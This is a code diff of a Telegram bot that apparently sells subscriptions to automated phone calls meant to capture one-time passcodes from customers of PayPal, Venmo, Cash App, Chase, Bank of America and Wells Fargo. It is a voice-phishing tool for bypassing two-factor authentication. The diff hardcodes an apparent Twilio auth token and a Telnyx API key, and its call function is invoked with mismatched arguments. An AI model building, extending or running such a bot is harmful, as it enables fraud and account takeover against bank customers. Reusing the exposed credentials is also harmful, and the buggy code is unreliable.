@@ -6,13 +6,20 @@ const authToken = 'b90ab5caf73ed1da0355d8d0dd7e319c';
 const twilio_cell_number = '+14179322556'
 const client = require('twilio')(accountSid, authToken);
 
+// TELNYX STUFF
+const MY_API_KEY = 'ASGHJ2J623RV34I3C63VTEY8C'
+const telnyx = require('telnyx')('YOUR_API_KEY');
+
 const express = require('express');
+const { Hangup } = require('twilio/lib/twiml/VoiceResponse');
+const { ServiceInstance } = require('twilio/lib/rest/chat/v1/service');
 const app = express();
 const port = process.env.PORT || 3000;
 
 
-function call (number, ctx){
-   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${number} \n please wait...`, {})
+function call (customer_number, ctx){
+   console.log(ctx)
+   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})
 
    client.calls
          .create({
@@ -29,34 +36,80 @@ function call (number, ctx){
 
 
 //  COMMANDS
-
-
-bot.command('start', ctx => {
+bot.on('start', ctx => {
    console.log(ctx.from)
-   bot.telegram.sendMessage(ctx.chat.id, 'hello there! Welcome to SmsBypass_otp_bot.', {})
+   bot.telegram.sendMessage(
+      ctx.chat.id, `
+      𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
+      ➤ Type: /purchase to subscribe \n 
+      👤 USER COMMANDS 👤 \n
+      ➤ /redeem - Redeem your key\n
+      ➤ /checktime - Check subscription time left\n\n
+      📞 CALL COMMANDS 📞 \n 
+      ➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
+      ➤ /bank - Capture bank OTP\n
+      ➤ /boa - Capture boa OTP\n
+      ➤ /chase - Capture chase OTP\n
+      ➤ /wellsfargo - Capture Wells fargo OTP\n
+      ➤ /venmo - Capture venmo OTP\n
+      ➤ /paypal - Capture bank OTP\n      
+      `, {})
 })
 
 bot.help(ctx => ctx.reply(`
-   '''How to use this bot'''\n
-   /call 'cell number'\n
-   \n
-   Thank you for using this service
+   𝕆𝔽𝔹𝕋ℂ 𝕆𝕋ℙ 𝔹𝕆𝕋! \n 
+➤ Type: /purchase to subscribe \n 
+👤 USER COMMANDS 👤 \n
+➤ /redeem - Redeem your key\n
+➤ /checktime - Check subscription time left\n\n
+📞 CALL COMMANDS 📞 \n 
+➤ /call - Capture OTP (Paypal, Venmo, cashapp...)\n
+➤ /bank - Capture bank OTP\n
+➤ /boa - Capture boa OTP\n
+➤ /chase - Capture chase OTP\n
+➤ /wellsfargo - Capture Wells fargo OTP\n
+➤ /venmo - Capture venmo OTP\n
+➤ /paypal - Capture bank OTP\n
 `))
 
 bot.command('call', ctx => {
-   const number = ctx.message.text.split(' ')[1];
+   console.log(ctx)
+   const number = ctx.message.text.split(' ');
+   const service = [ 'paypal', 'venmo', 'boa', 'chase', 'bank', 'cashapp' ]
 
-   bot.telegram.sendMessage(ctx.chat.id, `Placing call, please wait...`, {}).then(() =>{
-      call(number, ctx)      
-   })
+   if(!number[1] || !service.includes(number[3])){
+      bot.telegram.sendMessage(ctx.chat.id, `❌( Error )❌ : Invalid number or service not available`, {}).then(() => {})
+   }
+   else{
+      bot.telegram.sendMessage(ctx.chat.id, `Call has Started...`, {
+         reply_markup:{
+            inline_keyboard: [
+               [
+                  {
+                     text: 'End Call',
+                     callback_data: 'end'
+                  }               
+               ]
+            ]
+         }
+      }).then(() =>{
+         call(number[2], number[3], ctx)
+      })      
+   }
+
 
 })
+
 bot.launch();
 
 app.post('/process_gather', (req, res) => {
    const digits = req.body.Digits;
    console.log(digits);
-   res.send(`<Response><Say>You entered ${digits}</Say></Response>`);
+   res.send(`
+   <Response>
+      <Say>You entered ${digits}</Say>
+   </Response>
+   `);
  });
  
  app.listen(port, () => {
